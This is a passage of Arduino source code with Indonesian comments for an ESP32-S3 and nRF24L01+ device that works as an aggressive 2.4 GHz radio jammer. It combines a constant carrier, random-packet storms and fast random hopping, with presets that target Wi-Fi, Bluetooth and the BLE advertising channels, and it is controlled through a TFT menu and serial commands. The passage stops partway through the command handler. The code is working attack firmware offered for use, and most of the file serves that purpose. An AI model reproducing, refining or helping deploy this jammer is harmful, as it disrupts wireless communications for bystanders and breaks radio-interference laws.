/*
 * ███████╗███████╗██████╗ ██╗  ██╗███████╗ █████╗ ██╗   ██╗
 * ██╔════╝██╔════╝██╔══██╗██║  ██║██╔════╝██╔══██╗╚██╗ ██╔╝
 * ███████╗█████╗  ██████╔╝███████║███████╗███████║ ╚████╔╝ 
 * ╚════██║██╔══╝  ██╔══██╗██╔══██║╚════██║██╔══██║  ╚██╔╝  
 * ███████║███████╗██║  ██║██║  ██║███████║██║  ██║   ██║   
 * ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
 * 
 * ESP32-S3 RF24 AGGRESSIVE JAMMER
 * * Menggabungkan carrier, packet storm, dan random hopping
 * * Tanpa delay mikro yang tidak perlu - kecepatan maksimum
 * * Auto-recovery dan watchdog internal
 * 
 * PINOUT (sama seperti versi dasar, namun pin dapat diubah di #define)
 * ESP32-S3   -> nRF24L01+
 * 3.3V       -> VCC
 * GND        -> GND
 * GPIO5      -> CSN (SS)   <-- sesuaikan
 * GPIO4      -> CE         <-- sesuaikan
 * GPIO6      -> SCK        <-- sesuaikan
 * GPIO7      -> MOSI       <-- sesuaikan
 * GPIO8      -> MISO       <-- sesuaikan
 * 
 * Library: RF24 by TMRh20 (v1.4.2+)
 * 
 * PERINTAH SERIAL BARU:
 *   aggressive on/off   - Aktifkan mode agresif (tanpa jeda antar channel)
 *   turbo on/off        - Mode turbo: ganti channel setiap 50 µs (super cepat)
 *   storm on/off        - Kirim packet acak di setiap channel saat hopping
 *   blast               - Ledakan carrier tanpa henti pada satu channel (ignore hopping)
 *   randhop on/off      - Random hopping (bukan linear)
 *   kill                - Matikan semua transmisi dan reset radio ke mode idle
 *   channel <num>       - Tetap sama
 *   power <level>       - Tetap
 *   rate <speed>        - Tetap
 *   hopdwell <us>       - Dwell time (dalam mikrodetik) – minimum 1 µs
 *   hoprange <min><max> - Tetap
 *   band wifi           - Jamming khusus band Wi-Fi (ch 1-73 / 2401-2473 MHz)
 *   band bt             - Jamming khusus band Bluetooth (ch 2-80 / 2402-2480 MHz)
 *   band bleadv         - Jamming khusus 3 kanal advertising BLE (ch 2/26/80)
 *   band all            - Jamming seluruh band 2.4 GHz
 *   start / stop        - Tetap
 *   status / help       - Tetap
 * 
 * JIKA TIDAK ADA PERINTAH, MODE DEFAULT: AGGRESSIVE + RANDHOP + STORM = ON
 */

#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <RF24.h>

// Fehlende ST77XX-Grau-Konstante (RGB565 -> ausgewogene Graustufe ~50%)
#define ST77XX_GRAY 0x8410

// ============ PIN DEFINISI ============
#define CE_PIN   7
#define CSN_PIN  6
#define SCK_PIN  12
#define MOSI_PIN 11
#define MISO_PIN 13

// ============ KONFIGURASI DASAR ============
#define MIN_CHANNEL         0
#define MAX_CHANNEL         125
#define DEFAULT_POWER       RF24_PA_MAX
#define DEFAULT_RATE        RF24_2MBPS    // 2Mbps = lebih agresif
#define MIN_DWELL_US        1             // 1 mikrodetik = hampir tanpa jeda
#define MAX_DWELL_US        1000
#define DEFAULT_DWELL_US    10            // 10 µs untuk agresif

// ============ KONFIGURASI DISPLAY TFT 1.8' ============
#define TFT_SCK   18
#define TFT_SDA   17
#define TFT_AO    16
#define TFT_RST   15
#define TFT_CS    14

// ============ OBJEK TFT ============
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_AO, TFT_SDA, TFT_SCK, TFT_RST);
// lastDisplayUpdate dihapus karena UI baru menggunakan system needRedraw + processUI/updateUI

// ============ PIN TOMBOL ============
#define BTN_UP    10
#define BTN_RIGHT 9
#define BTN_DOWN  8
#define BTN_B     5

// ===== PRESET BAND TARGET  (frekuensi = 2400 + RF24 channel MHz) =====
#define WIFI_MIN_CH         1     // 2401 MHz - awal band Wi-Fi (ch 1-13)
#define WIFI_MAX_CH         73    // 2473 MHz - akhir band Wi-Fi
#define BT_MIN_CH           2     // 2402 MHz - awal band Bluetooth
#define BT_MAX_CH           80    // 2480 MHz - akhir band Bluetooth (BR/EDR + BLE)

// ============ OBJEK RADIO ============
RF24 radio(CE_PIN, CSN_PIN);

// ============ STATUS & KONFIGURASI ============
bool jamming = false;
bool aggressiveMode = true;      // Default agresif
bool turboMode = false;          // Super cepat, abaikan dwell
bool stormMode = true;           // Kirim packet saat hopping
bool randomHop = true;           // Random hopping, bukan linear
bool blastMode = false;          // Ignore hopping, tetap di satu channel

int currentChannel = 80;          // default tengah
rf24_pa_dbm_e powerLevel = DEFAULT_POWER;
rf24_datarate_e dataRate = DEFAULT_RATE;
String powerStr = "MAX";
String rateStr = "2MBPS";

unsigned long hopDwell = DEFAULT_DWELL_US;
int hopMin = MIN_CHANNEL;
int hopMax = MAX_CHANNEL;
String targetBand = "ALL";      // Kategori target: ALL / WIFI / BT / BLE-ADV
const int bleAdvCh[3] = {2, 26, 80};  // 3 kanal advertising BLE (2402/2426/2480 MHz)

const unsigned long DISPLAY_INTERVAL = 200; // ms

// ============ BUFFER UNTUK PACKET STORM ============
uint8_t randomPayload[32];
uint8_t pipeAddress[5] = {0xE7, 0xE7, 0xE7, 0xE7, 0xE7}; // dummy

// ============ WATCHDOG ============
hw_timer_t *watchdogTimer = NULL;
bool watchdogTriggered = false;

// ============ PROTOTYPE FUNGSI ============
void processSerialCommand(String cmd);
void startJamming();
void stopJamming();
void setChannel(int ch);
void applyRadioConfig();
void jamLoop();
void generateRandomPayload();
void IRAM_ATTR watchdogISR();
void processUI();
void updateUI();

// ============ STATE UI ============
enum MenuState {
  MAIN_MENU,
  SUB_CHANNEL,
  SUB_POWER,
  SUB_RATE,
  SUB_AGGRESSIVE,
  SUB_TURBO,
  SUB_STORM,
  SUB_RANDHOP,
  SUB_BLAST,
  SUB_HOPDWELL,
  SUB_HOPRANGE,
  SUB_BAND,
  SUB_STATUS
};

MenuState currentState = MAIN_MENU;
int menuIndex = 0;           // indeks item menu utama
int subOption = 0;           // untuk pilihan dalam submenu (misal power, rate, band)
int editValue = 0;           // untuk mengedit angka (channel, hopdwell)
int editMin = 0, editMax = 0;// untuk hoprange (nilai sementara)

const char* mainMenuItems[] = {
  "Start/Stop",
  "Channel",
  "Power",
  "Rate",
  "Aggressive",
  "Turbo",
  "Storm",
  "RandHop",
  "Blast",
  "HopDwell",
  "HopRange",
  "Band",
  "Status"
};
const int mainMenuCount = 13;

bool needRedraw = true;
unsigned long lastButtonCheck = 0;
const unsigned long BUTTON_DEBOUNCE = 50; // ms

// ============================================
// SETUP
// ============================================
void setup() {
    Serial.begin(115200);
    delay(500);
    // Inisialisasi tombol (pull-up internal, aktif LOW)
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_B, INPUT_PULLUP);
    Serial.println("Type 'help' for command list.");

    tft.initR(INITR_BLACKTAB);   // untuk ST7735 128x160
    tft.setRotation(3);          // Landscape terbalik 180° agar posisi display benar (1 = terbalik)
    tft.fillScreen(ST77XX_BLACK);
    tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
    tft.setTextSize(1);
    tft.setCursor(0, 0);
    tft.println("RF24 JAMMER");

    // Inisialisasi SPI
    SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CSN_PIN);

    // Inisialisasi radio
    if (!radio.begin()) {
        Serial.println("   FATAL: nRF24L01+ is not detected!");
        Serial.println("   Check wiring. System HANG.");
        while (1) { delay(1000); }
    }

    // Konfigurasi agresif
    radio.setPALevel(DEFAULT_POWER);
    radio.setDataRate(DEFAULT_RATE);
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setChannel(currentChannel);
    radio.setPayloadSize(32);
    radio.openWritingPipe(pipeAddress);

    // Generate payload acak awal
    generateRandomPayload();

    Serial.println("RF24 is ready (default)");
    Serial.println("   Power: MAX, Rate: 2MBPS, Dwell: 10µs, RandomHop: ON, Storm: ON");
    Serial.println("⚡ Ketik 'start' untuk meluncurkan serangan.\n");

    // Setup hardware watchdog (ESP32-S3) - akan reset jika loop berhenti > 3 detik
    watchdogTimer = timerBegin(0, 80, true); // 1 tick = 1 µs (80 MHz clock)
    timerAttachInterrupt(watchdogTimer, &watchdogISR, true);
    timerAlarmWrite(watchdogTimer, 3000000, false); // 3 detik
    timerAlarmEnable(watchdogTimer);
}

// ============ FUNGSI TOMBOL (DEBOUNCE FIX) ============
// Algoritma:
// - lastChangeTime[4]: mencatat kapan transisi dimulai (0 = tidak ada transisi)
// - stableState[4]:    state yang sudah stabil (ter-debounce)
// - Saat raw != stableState → catat waktu transisi, tunggu 50ms
// - Saat raw == stableState → reset timer transisi (tidak ada perubahan)
int readButton(int pin) {
  static unsigned long lastChangeTime[4] = {0, 0, 0, 0};
  static int stableState[4] = {HIGH, HIGH, HIGH, HIGH};
  int idx;
  if (pin == BTN_UP) idx = 0;
  else if (pin == BTN_RIGHT) idx = 1;
  else if (pin == BTN_DOWN) idx = 2;
  else if (pin == BTN_B) idx = 3;
  else return HIGH;

  int raw = digitalRead(pin);
  unsigned long now = millis();

  if (raw != stableState[idx]) {
    // Ada perubahan — mulai atau lanjutkan timer debounce
    if (lastChangeTime[idx] == 0) {
      lastChangeTime[idx] = now;  // Catat awal transisi (hanya SEKALI)
    }
    if (now - lastChangeTime[idx] >= BUTTON_DEBOUNCE) {
      stableState[idx] = raw;       // Terima state baru setelah stabil
      lastChangeTime[idx] = 0;      // Reset untuk transisi berikutnya
    }
  } else {
    lastChangeTime[idx] = 0;        // Kembali ke state stabil — reset timer
  }
  return stableState[idx];
}
// Fungsi untuk mendeteksi tekan (transisi HIGH->LOW)
bool buttonPressed(int pin) {
  static int prevState[4] = {HIGH, HIGH, HIGH, HIGH};
  int idx;
  if (pin == BTN_UP) idx = 0;
  else if (pin == BTN_RIGHT) idx = 1;
  else if (pin == BTN_DOWN) idx = 2;
  else if (pin == BTN_B) idx = 3;
  else return false;
  
  int state = readButton(pin);
  bool pressed = (prevState[idx] == HIGH && state == LOW);
  prevState[idx] = state;
  return pressed;
}

// ============================================
// LOOP UTAMA
// ============================================
void loop() {
    // Reset watchdog setiap iterasi (tandai loop masih hidup)
    timerWrite(watchdogTimer, 0);  // reset counter

    // Baca perintah serial
    if (Serial.available() > 0) {
        String cmd = Serial.readStringUntil('\n');
        processSerialCommand(cmd);
    }

    // Proses UI dan tombol SEBELUM jamming agar responsif
    processUI();

    // Jalankan jamming jika aktif
    if (jamming) {
        jamLoop();
    } else {
        // Jika tidak jamming, tetap refresh radio (idle)
        delay(10);
    }

    // Update display (hanya menggambar jika needRedraw true)
    updateUI();

    // Jika watchdog trigger, restart otomatis (tidak terjadi jika loop berjalan)
    if (watchdogTriggered) {
        Serial.println("WATCHDOG TRIGGERED! Restarting...");
        ESP.restart();
    }
}

// ============================================
// UI DISPLAY
// ============================================
void drawMainMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(1);
  tft.setTextColor(ST77XX_CYAN, ST77XX_BLACK);
  tft.println("=== RF24 JAMMER ===");
  tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
  
  int start = 0;
  int visible = 10; // jumlah item yang bisa ditampilkan sekaligus
  if (menuIndex >= visible) start = menuIndex - visible + 1;
  int end = start + visible;
  if (end > mainMenuCount) end = mainMenuCount;

  for (int i = start; i < end; i++) {
    tft.setCursor(0, 20 + (i - start) * 12);
    if (i == menuIndex) {
      tft.setTextColor(ST77XX_YELLOW, ST77XX_BLACK);
      tft.print("> ");
    } else {
      tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
      tft.print("  ");
    }
    tft.print(mainMenuItems[i]);
    // Tampilkan status singkat di samping item
    if (i == 0) {
      tft.print(": ");
      tft.println(jamming ? "ACT" : "STP");
    } else if (i == 1) {
      tft.print(": ");
      tft.println(currentChannel);
    } else if (i == 2) {
      tft.print(": ");
      tft.println(powerStr);
    } else if (i == 3) {
      tft.print(": ");
      tft.println(rateStr);
    } else if (i == 4) {
      tft.print(": ");
      tft.println(aggressiveMode ? "ON" : "OFF");
    } else if (i == 5) {
      tft.print(": ");
      tft.println(turboMode ? "ON" : "OFF");
    } else if (i == 6) {
      tft.print(": ");
      tft.println(stormMode ? "ON" : "OFF");
    } else if (i == 7) {
      tft.print(": ");
      tft.println(randomHop ? "ON" : "OFF");
    } else if (i == 8) {
      tft.print(": ");
      tft.println(blastMode ? "ON" : "OFF");
    } else if (i == 9) {
      tft.print(": ");
      tft.println(hopDwell);
    } else if (i == 10) {
      tft.print(": ");
      tft.print(hopMin);
      tft.print("-");
      tft.println(hopMax);
    } else if (i == 11) {
      tft.print(": ");
      tft.println(targetBand);
    } else if (i == 12) {
      // Status - hanya teks
    }
  }
  // Informasi navigasi
  tft.setCursor(0, 150);
  tft.setTextColor(0x8410, ST77XX_BLACK);
  tft.print("UP/DN SEL RTN");
}

void drawSubMenu(int type, const char* title, const char** options, int optCount, int selected) {
  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(1);
  tft.setTextColor(ST77XX_CYAN, ST77XX_BLACK);
  tft.print(title);
  tft.println(":");
  
  for (int i = 0; i < optCount; i++) {
    tft.setCursor(0, 20 + i * 12);
    if (i == selected) {
      tft.setTextColor(ST77XX_YELLOW, ST77XX_BLACK);
      tft.print("> ");
    } else {
      tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
      tft.print("  ");
    }
    tft.println(options[i]);
  }
  tft.setCursor(0, 150);
  tft.setTextColor(0x8410, ST77XX_BLACK);
  tft.print("UP/DN SELECT, B=back");
}

void drawEditNumber(const char* title, int value, int minVal, int maxVal) {
  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(1);
  tft.setTextColor(ST77XX_CYAN, ST77XX_BLACK);
  tft.println(title);
  tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
  tft.setCursor(0, 30);
  tft.print("Value: ");
  tft.println(value);
  tft.setCursor(0, 60);
  tft.print("Range: ");
  tft.print(minVal);
  tft.print(" - ");
  tft.println(maxVal);
  tft.setCursor(0, 150);
  tft.setTextColor(0x8410, ST77XX_BLACK);
  tft.print("UP/DN change, RT=set, B=back");
}

void updateUI() {
  if (!needRedraw) return;
  needRedraw = false;
  
  switch (currentState) {
    case MAIN_MENU:
      drawMainMenu();
      break;
    case SUB_CHANNEL:
      drawEditNumber("Channel", editValue, MIN_CHANNEL, MAX_CHANNEL);
      break;
    case SUB_POWER: {
      const char* opts[] = {"MAX", "HIGH", "LOW", "MIN"};
      drawSubMenu(SUB_POWER, "Power", opts, 4, subOption);
      break;
    }
    case SUB_RATE: {
      const char* opts[] = {"250KBPS", "1MBPS", "2MBPS"};
      drawSubMenu(SUB_RATE, "Rate", opts, 3, subOption);
      break;
    }
    case SUB_AGGRESSIVE: {
      const char* opts[] = {"OFF", "ON"};
      drawSubMenu(SUB_AGGRESSIVE, "Aggressive", opts, 2, subOption);
      break;
    }
    case SUB_TURBO: {
      const char* opts[] = {"OFF", "ON"};
      drawSubMenu(SUB_TURBO, "Turbo", opts, 2, subOption);
      break;
    }
    case SUB_STORM: {
      const char* opts[] = {"OFF", "ON"};
      drawSubMenu(SUB_STORM, "Storm", opts, 2, subOption);
      break;
    }
    case SUB_RANDHOP: {
      const char* opts[] = {"OFF", "ON"};
      drawSubMenu(SUB_RANDHOP, "RandHop", opts, 2, subOption);
      break;
    }
    case SUB_BLAST: {
      const char* opts[] = {"OFF", "ON"};
      drawSubMenu(SUB_BLAST, "Blast", opts, 2, subOption);
      break;
    }
    case SUB_HOPDWELL:
      drawEditNumber("HopDwell (us)", editValue, MIN_DWELL_US, MAX_DWELL_US);
      break;
    case SUB_HOPRANGE: {
      tft.fillScreen(ST77XX_BLACK);
      tft.setCursor(0, 0);
      tft.setTextSize(1);
      tft.setTextColor(ST77XX_CYAN, ST77XX_BLACK);
      tft.println("HopRange");
      tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
      tft.setCursor(0, 30);
      tft.print("Min: ");
      tft.println(editMin);
      tft.setCursor(0, 50);
      tft.print("Max: ");
      tft.println(editMax);
      tft.setCursor(0, 100);
      tft.setTextColor(ST77XX_GRAY, ST77XX_BLACK);
      tft.println("UP/DN change, RT=set, B=back");
      break;
    }
    case SUB_BAND: {
      const char* opts[] = {"ALL", "WIFI", "BT", "BLEADV"};
      int sel = 0;
      if (targetBand == "ALL") sel = 0;
      else if (targetBand == "WIFI") sel = 1;
      else if (targetBand == "BT") sel = 2;
      else if (targetBand == "BLE-ADV") sel = 3;
      drawSubMenu(SUB_BAND, "Band", opts, 4, sel);
      break;
    }
    case SUB_STATUS: {
      tft.fillScreen(ST77XX_BLACK);
      tft.setCursor(0, 0);
      tft.setTextSize(1);
      tft.setTextColor(ST77XX_CYAN, ST77XX_BLACK);
      tft.println("=== STATUS ===");
      tft.setTextColor(ST77XX_WHITE, ST77XX_BLACK);
      tft.print("Jamming : "); tft.println(jamming ? "ACTIVE" : "STOPPED");
      tft.print("Channel : "); tft.println(currentChannel);
      tft.print("Power   : "); tft.println(powerStr);
      tft.print("Rate    : "); tft.println(rateStr);
      tft.print("Aggr    : "); tft.println(aggressiveMode ? "ON" : "OFF");
      tft.print("Turbo   : "); tft.println(turboMode ? "ON" : "OFF");
      tft.print("Storm   : "); tft.println(stormMode ? "ON" : "OFF");
      tft.print("RandHop : "); tft.println(randomHop ? "ON" : "OFF");
      tft.print("Blast   : "); tft.println(blastMode ? "ON" : "OFF");
      tft.print("Dwell   : "); tft.println(hopDwell);
      tft.print("Range   : "); tft.print(hopMin); tft.print("-"); tft.println(hopMax);
      tft.print("Band    : "); tft.println(targetBand);
      tft.setCursor(0, 150);
      tft.setTextColor(ST77XX_GRAY, ST77XX_BLACK);
      tft.print("Press B to return");
      break;
    }
    default: break;
  }
}

// ============================================
// PROSES UI (tombol)
// ============================================
void processUI() {
  // Cek tombol
  if (buttonPressed(BTN_UP)) {
    if (currentState == MAIN_MENU) {
      menuIndex = (menuIndex - 1 + mainMenuCount) % mainMenuCount;
      needRedraw = true;
    } else if (currentState == SUB_CHANNEL) {
      editValue = constrain(editValue + 1, MIN_CHANNEL, MAX_CHANNEL);
      needRedraw = true;
    } else if (currentState == SUB_HOPDWELL) {
      editValue = constrain(editValue + 1, MIN_DWELL_US, MAX_DWELL_US);
      needRedraw = true;
    } else if (currentState == SUB_HOPRANGE) {
      // editMin dulu, jika sudah di max maka editMax
      // Kita gunakan subOption untuk tahu mana yang diedit: 0=min, 1=max
      if (subOption == 0) {
        editMin = constrain(editMin + 1, MIN_CHANNEL, editMax);
      } else {
        editMax = constrain(editMax + 1, editMin, MAX_CHANNEL);
      }
      needRedraw = true;
    } else if (currentState == SUB_POWER || currentState == SUB_RATE || currentState == SUB_BAND) {
      subOption = (subOption + 1) % (currentState == SUB_POWER ? 4 : (currentState == SUB_RATE ? 3 : 4));
      needRedraw = true;
    } else if (currentState == SUB_AGGRESSIVE || currentState == SUB_TURBO || currentState == SUB_STORM || 
               currentState == SUB_RANDHOP || currentState == SUB_BLAST) {
      subOption = (subOption + 1) % 2;  // Toggle ON/OFF
      needRedraw = true;
    }
  }
  else if (buttonPressed(BTN_DOWN)) {
    if (currentState == MAIN_MENU) {
      menuIndex = (menuIndex + 1) % mainMenuCount;
      needRedraw = true;
    } else if (currentState == SUB_CHANNEL) {
      editValue = constrain(editValue - 1, MIN_CHANNEL, MAX_CHANNEL);
      needRedraw = true;
    } else if (currentState == SUB_HOPDWELL) {
      editValue = constrain(editValue - 1, MIN_DWELL_US, MAX_DWELL_US);
      needRedraw = true;
    } else if (currentState == SUB_HOPRANGE) {
      if (subOption == 0) {
        editMin = constrain(editMin - 1, MIN_CHANNEL, editMax);
      } else {
        editMax = constrain(editMax - 1, editMin, MAX_CHANNEL);
      }
      needRedraw = true;
    } else if (currentState == SUB_POWER || currentState == SUB_RATE || currentState == SUB_BAND) {
      subOption = (subOption - 1 + (currentState == SUB_POWER ? 4 : (currentState == SUB_RATE ? 3 : 4))) % (currentState == SUB_POWER ? 4 : (currentState == SUB_RATE ? 3 : 4));
      needRedraw = true;
    } else if (currentState == SUB_AGGRESSIVE || currentState == SUB_TURBO || currentState == SUB_STORM || 
               currentState == SUB_RANDHOP || currentState == SUB_BLAST) {
      subOption = (subOption - 1 + 2) % 2;  // Toggle ON/OFF
      needRedraw = true;
    }
  }
  else if (buttonPressed(BTN_RIGHT)) {
    if (currentState == MAIN_MENU) {
      // Masuk ke submenu berdasarkan menuIndex
      switch (menuIndex) {
        case 0: // Start/Stop
          if (jamming) stopJamming(); else startJamming();
          needRedraw = true;
          break;
        case 1: currentState = SUB_CHANNEL; editValue = currentChannel; needRedraw = true; break;
        case 2: currentState = SUB_POWER; subOption = (powerStr == "MAX" ? 0 : powerStr == "HIGH" ? 1 : powerStr == "LOW" ? 2 : 3); needRedraw = true; break;
        case 3: currentState = SUB_RATE; subOption = (rateStr == "250KBPS" ? 0 : rateStr == "1MBPS" ? 1 : 2); needRedraw = true; break;
        case 4: currentState = SUB_AGGRESSIVE; subOption = aggressiveMode ? 1 : 0; needRedraw = true; break;
        case 5: currentState = SUB_TURBO; subOption = turboMode ? 1 : 0; needRedraw = true; break;
        case 6: currentState = SUB_STORM; subOption = stormMode ? 1 : 0; needRedraw = true; break;
        case 7: currentState = SUB_RANDHOP; subOption = randomHop ? 1 : 0; needRedraw = true; break;
        case 8: currentState = SUB_BLAST; subOption = blastMode ? 1 : 0; needRedraw = true; break;
        case 9: currentState = SUB_HOPDWELL; editValue = hopDwell; needRedraw = true; break;
        case 10: currentState = SUB_HOPRANGE; editMin = hopMin; editMax = hopMax; subOption = 0; needRedraw = true; break;
        case 11: currentState = SUB_BAND; 
          if (targetBand == "ALL") subOption = 0;
          else if (targetBand == "WIFI") subOption = 1;
          else if (targetBand == "BT") subOption = 2;
          else if (targetBand == "BLE-ADV") subOption = 3;
          needRedraw = true; 
          break;
        case 12: currentState = SUB_STATUS; needRedraw = true; break;
        default: break;
      }
    } else {
      // Di submenu, RIGHT = konfirmasi/terapkan
      switch (currentState) {
        case SUB_CHANNEL:
          if (editValue >= MIN_CHANNEL && editValue <= MAX_CHANNEL) {
            currentChannel = editValue;
            if (jamming) setChannel(currentChannel);
            Serial.println("Channel set to " + String(currentChannel));
          }
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        case SUB_POWER: {
          const char* pw[] = {"MAX","HIGH","LOW","MIN"};
          String p = String(pw[subOption]);
          processSerialCommand("power " + p);
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_RATE: {
          const char* rt[] = {"250KBPS","1MBPS","2MBPS"};
          String r = String(rt[subOption]);
          processSerialCommand("rate " + r);
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_AGGRESSIVE: {
          bool val = (subOption == 1); // 1 = ON
          processSerialCommand(val ? "aggressive on" : "aggressive off");
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_TURBO: {
          bool val = (subOption == 1);
          processSerialCommand(val ? "turbo on" : "turbo off");
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_STORM: {
          bool val = (subOption == 1);
          processSerialCommand(val ? "storm on" : "storm off");
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_RANDHOP: {
          bool val = (subOption == 1);
          processSerialCommand(val ? "randhop on" : "randhop off");
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_BLAST: {
          bool val = (subOption == 1);
          processSerialCommand(val ? "blast on" : "blast off");
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_HOPDWELL:
          if (editValue >= MIN_DWELL_US && editValue <= MAX_DWELL_US) {
            hopDwell = editValue;
            Serial.println("HopDwell set to " + String(hopDwell) + " us");
          }
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        case SUB_HOPRANGE:
          if (editMin >= MIN_CHANNEL && editMax <= MAX_CHANNEL && editMin <= editMax) {
            hopMin = editMin; hopMax = editMax;
            Serial.println("HopRange set to " + String(hopMin) + "-" + String(hopMax));
          }
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        case SUB_BAND: {
          const char* bands[] = {"all","wifi","bt","bleadv"};
          processSerialCommand(String("band ") + bands[subOption]);
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        }
        case SUB_STATUS:
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
        default:
          currentState = MAIN_MENU;
          needRedraw = true;
          break;
      }
    }
  }
  else if (buttonPressed(BTN_B)) {
    if (currentState != MAIN_MENU) {
      currentState = MAIN_MENU;
      needRedraw = true;
    }
    // Jika di main menu, tombol B tidak melakukan apa-apa (atau bisa digunakan untuk stop?)
    // Kita biarkan saja.
  }
}

// ============================================
// JAMMING LOOP - INTI AGRESIF
// ============================================
void jamLoop() {
    // ===== BLAST MODE: carrier tetap =====
    if (blastMode) {
        radio.startConstCarrier(powerLevel, currentChannel);
        delayMicroseconds(1);
        processUI();  // Cek tombol selama blast
        return;
    }

    // ===== STEP 1: Pilih channel =====
    if (randomHop) {
        int ch;
        if (targetBand == "BLE-ADV") {
            ch = bleAdvCh[random(0, 3)];
        } else {
            ch = random(hopMin, hopMax + 1);
        }
        setChannel(ch);
    } else {
        // Linear sweep
        static int sweepChannel = hopMin;
        setChannel(sweepChannel);
        sweepChannel++;
        if (sweepChannel > hopMax) sweepChannel = hopMin;
    }

    // ===== STEP 2: Kirim storm packet SEBELUM carrier =====
    // (radio.write() TIDAK bisa dipanggil saat constant carrier ON)
    if (stormMode) {
        radio.stopConstCarrier(); // Pastikan carrier OFF
        for (int i = 0; i < 5; i++) {
            generateRandomPayload();
            radio.write(randomPayload, 32);
            if (i % 2 == 0) processUI(); // Cek tombol di sela packet
        }
    }

    // ===== STEP 3: Start carrier + dwell =====
    radio.startConstCarrier(powerLevel, currentChannel);

    unsigned long dwell = turboMode ? MIN_DWELL_US : hopDwell;
    if (dwell > 1000) {
        // Bagi dwell panjang jadi segmen 1ms agar UI tetap responsif
        while (dwell > 1000) {
            delayMicroseconds(1000);
            dwell -= 1000;
            processUI();
            if (!jamming) break;
        }
    }
    if (dwell > 0 && jamming) {
        delayMicroseconds(dwell);
    } else if (!jamming) {
        // Jamming dihentikan di tengah dwell
        radio.stopConstCarrier();
        return;
    }

    // ===== STEP 4: Hentikan carrier =====
    radio.stopConstCarrier();
}

// ============================================
// FUNGSI BANTUAN
// ============================================
void setChannel(int ch) {
    if (ch < hopMin) ch = hopMin;
    if (ch > hopMax) ch = hopMax;
    currentChannel = ch;
    radio.setChannel(ch);
}

void applyRadioConfig() {
    radio.setPALevel(powerLevel);
    radio.setDataRate(dataRate);
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setPayloadSize(32);
    radio.openWritingPipe(pipeAddress);
}

void generateRandomPayload() {
    for (int i = 0; i < 32; i++) {
        randomPayload[i] = random(0, 256);
    }
}

void IRAM_ATTR watchdogISR() {
    watchdogTriggered = true;
}

// ============================================
// SERIAL COMMAND PROCESSOR (DIPERLUAS)
// ============================================
void processSerialCommand(String cmd) {
    cmd.trim();
    cmd.toLowerCase();

    if (cmd == "start") {
        startJamming();
    }
    else if (cmd == "stop") {
        stopJamming();
    }
    else if (cmd.startsWith("channel ")) {
        int ch = cmd.substring(8).toInt();
        if (ch >= MIN_CHANNEL && ch <= MAX_CHANNEL) {
            currentChannel = ch;
            if (jamming) {
                setChannel(currentChannel);
            }
            Serial.println("Channel fixed: " + String(currentChannel));
        } else {
            Serial.println("Channel invalid (0-125)");
        }
    }
    else if (cmd.startsWith("power ")) {
        String level = cmd.substring(6);
        level.toUpperCase();
        if (level == "MAX") { powerLevel = RF24_PA_MAX; powerStr = "MAX"; }
        else if (level == "HIGH") { powerLevel = RF24_PA_HIGH; powerStr = "HIGH"; }
        else if (level == "LOW") { powerLevel = RF24_PA_LOW; powerStr = "LOW"; }
        else if (level == "MIN") { powerLevel = RF24_PA_MIN; powerStr = "MIN"; }
        else { Serial.println("Use MAX/HIGH/LOW/MIN"); return; }
        if (jamming) applyRadioConfig();
        Serial.println("Power: " + powerStr);
    }
    else if (cmd.startsWith("rate ")) {
        String rate = cmd.substring(5);
        rate.toUpperCase();
        if (rate == "250KBPS") { dataRate = RF24_250KBPS; rateStr = "250KBPS"; }
        else if (rate == "1MBPS") { dataRate = RF24_1MBPS; rateStr = "1MBPS"; }
        else if (rate == "2MBPS") { dataRate = RF24_2MBPS; rateStr = "2MBPS"; }
        else { Serial.println("Use 250KBPS/1MBPS/2MBPS"); return; }
        if (jamming) applyRadioConfig();
        Serial.println("⚡ Rate: " + rateStr);
    }
    else if (cmd == "aggressive on") {
        aggressiveMode = true;
        if (jamming) Serial.println("Aggressive mode ON (dwell minimal)");
        else Serial.println("Aggressive mode ON");
    }
    else if (cmd == "aggressive off") {
        aggressiveMode = false;
        if (jamming) Serial.println("Aggressive mode OFF (dwell normal)");
        else Serial.println("Aggressive mode OFF");
    }
    else if (cmd == "turbo on") {
        turboMode = true;
        Serial.println("TURBO MODE ON (dwell = 1 µs)");
    }
    else if (cmd == "turbo off") {
        turboMode = false;
        Serial.println("TURBO MODE OFF");
    }
    else if (cmd == "storm on") {
        stormMode = true;
        Serial.println("PACKET STORM ON");
    }
    else if (cmd == "storm off") {
        stormMode = false;
        Serial.println("PACKET STORM OFF");
    }
    else if (cmd == "randhop on") {
        randomHop = true;
